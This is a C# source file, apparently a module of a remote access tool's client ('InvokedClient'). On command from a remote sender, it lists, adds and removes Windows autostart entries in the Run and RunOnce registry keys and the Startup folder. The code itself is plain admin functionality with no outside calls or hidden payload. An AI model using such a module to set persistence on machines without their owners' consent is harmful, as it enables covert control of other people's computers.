

using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using InvokedClient.Extensions;
using InvokedClient.Helper;
using InvokedCommon.Enums;
using InvokedCommon.Messages;
using InvokedCommon.Models;
using InvokedCommon.Networking;
using Microsoft.Win32;


namespace InvokedClient.MessageHandlers
{
	public class StartupManagerHandler : IMessageProcessor
	{
		public bool CanExecute(IMessage message)
		{
			switch (message)
			{
				case GetStartupItems _:
				case DoStartupItemAdd _:
					return true;
				default:
					return message is DoStartupItemRemove;
			}
		}

		public bool CanExecuteFrom(ISender sender) => true;

		public void Execute(ISender sender, IMessage message)
		{
			switch (message)
			{
				case GetStartupItems message1:
					this.Execute(sender, message1);
					break;
				case DoStartupItemAdd message2:
					this.Execute(sender, message2);
					break;
				case DoStartupItemRemove message3:
					this.Execute(sender, message3);
					break;
			}
		}

		private void Execute(ISender client, GetStartupItems message)
		{
			try
			{
				List<StartupItem> startupItemList = new List<StartupItem>();
				using (RegistryKey key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"))
				{
					if (key != null)
					{
						foreach (Tuple<string, string> keyValue in key.GetKeyValues())
							startupItemList.Add(new StartupItem()
							{
								Name = keyValue.Item1,
								Path = keyValue.Item2,
								Type = StartupType.LocalMachineRun
							});
					}
				}
				using (RegistryKey key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"))
				{
					if (key != null)
					{
						foreach (Tuple<string, string> keyValue in key.GetKeyValues())
							startupItemList.Add(new StartupItem()
							{
								Name = keyValue.Item1,
								Path = keyValue.Item2,
								Type = StartupType.LocalMachineRunOnce
							});
					}
				}
				using (RegistryKey key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"))
				{
					if (key != null)
					{
						foreach (Tuple<string, string> keyValue in key.GetKeyValues())
							startupItemList.Add(new StartupItem()
							{
								Name = keyValue.Item1,
								Path = keyValue.Item2,
								Type = StartupType.CurrentUserRun
							});
					}
				}
				using (RegistryKey key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce"))
				{
					if (key != null)
					{
						foreach (Tuple<string, string> keyValue in key.GetKeyValues())
							startupItemList.Add(new StartupItem()
							{
								Name = keyValue.Item1,
								Path = keyValue.Item2,
								Type = StartupType.CurrentUserRunOnce
							});
					}
				}
				using (RegistryKey key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run"))
				{
					if (key != null)
					{
						foreach (Tuple<string, string> keyValue in key.GetKeyValues())
							startupItemList.Add(new StartupItem()
							{
								Name = keyValue.Item1,
								Path = keyValue.Item2,
								Type = StartupType.LocalMachineRunX86
							});
					}
				}
				using (RegistryKey key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce"))
				{
					if (key != null)
					{
						foreach (Tuple<string, string> keyValue in key.GetKeyValues())
							startupItemList.Add(new StartupItem()
							{
								Name = keyValue.Item1,
								Path = keyValue.Item2,
								Type = StartupType.LocalMachineRunOnceX86
							});
					}
				}
				if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup)))
				{
					FileInfo[] files = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.Startup)).GetFiles();
					startupItemList.AddRange(((IEnumerable<FileInfo>)files).Where<FileInfo>((Func<FileInfo, bool>)(file => file.Name != "desktop.ini")).Select<FileInfo, StartupItem>((Func<FileInfo, StartupItem>)(file => new StartupItem()
					{
						Name = file.Name,
						Path = file.FullName,
						Type = StartupType.StartMenu
					})));
				}
				client.Send<GetStartupItemsResponse>(new GetStartupItemsResponse()
				{
					StartupItems = startupItemList
				});
			}
			catch (Exception ex)
			{
				client.Send<SetStatus>(new SetStatus()
				{
					Message = "Getting Autostart Items failed: " + ex.Message
				});
			}
		}

		private void Execute(ISender client, DoStartupItemAdd message)
		{
			try
			{
				switch (message.StartupItem.Type)
				{
					case StartupType.LocalMachineRun:
						if (RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", message.StartupItem.Name, message.StartupItem.Path, true))
							break;
						throw new Exception("Could not add value");
					case StartupType.LocalMachineRunOnce:
						if (RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", message.StartupItem.Name, message.StartupItem.Path, true))
							break;
						throw new Exception("Could not add value");
					case StartupType.CurrentUserRun:
						if (RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", message.StartupItem.Name, message.StartupItem.Path, true))
							break;
						throw new Exception("Could not add value");
					case StartupType.CurrentUserRunOnce:
						if (RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", message.StartupItem.Name, message.StartupItem.Path, true))
							break;
						throw new Exception("Could not add value");
					case StartupType.StartMenu:
						if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup)))
							Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.Startup));
						using (StreamWriter streamWriter = new StreamWriter(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), message.StartupItem.Name + ".url"), false))
						{
							streamWriter.WriteLine("[InternetShortcut]");
							streamWriter.WriteLine("URL=file:///" + message.StartupItem.Path);
							streamWriter.WriteLine("IconIndex=0");
							streamWriter.WriteLine("IconFile=" + message.StartupItem.Path.Replace('\\', '/'));
							streamWriter.Flush();
							break;
						}
					case StartupType.LocalMachineRunX86:
						if (RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", message.StartupItem.Name, message.StartupItem.Path, true))
							break;
						throw new Exception("Could not add value");
					case StartupType.LocalMachineRunOnceX86:
						if (RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce", message.StartupItem.Name, message.StartupItem.Path, true))
							break;
						throw new Exception("Could not add value");
				}
			}
			catch (Exception ex)
			{
				client.Send<SetStatus>(new SetStatus()
				{
					Message = "Adding Autostart Item failed: " + ex.Message
				});
			}
		}

		private void Execute(ISender client, DoStartupItemRemove message)
		{
			try
			{
				switch (message.StartupItem.Type)
				{
					case StartupType.LocalMachineRun:
						if (RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", message.StartupItem.Name))
							break;
						throw new Exception("Could not remove value");
					case StartupType.LocalMachineRunOnce:
						if (RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.LocalMachine, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", message.StartupItem.Name))
							break;
						throw new Exception("Could not remove value");
					case StartupType.CurrentUserRun:
						if (RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", message.StartupItem.Name))
							break;
						throw new Exception("Could not remove value");
					case StartupType.CurrentUserRunOnce:
						if (RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.CurrentUser, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", message.StartupItem.Name))
							break;
						throw new Exception("Could not remove value");
					case StartupType.StartMenu:
						string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), message.StartupItem.Name);
						if (!File.Exists(path))
							throw new IOException("File does not exist");
						File.Delete(path);
						break;
					case StartupType.LocalMachineRunX86:
						if (RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", message.StartupItem.Name))
							break;
						throw new Exception("Could not remove value");
					case StartupType.LocalMachineRunOnceX86:
						if (RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.LocalMachine, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce", message.StartupItem.Name))
							break;
						throw new Exception("Could not remove value");
				}
			}
			catch (Exception ex)
			{
				client.Send<SetStatus>(new SetStatus()
				{
					Message = "Removing Autostart Item failed: " + ex.Message
				});
			}
		}
	}
}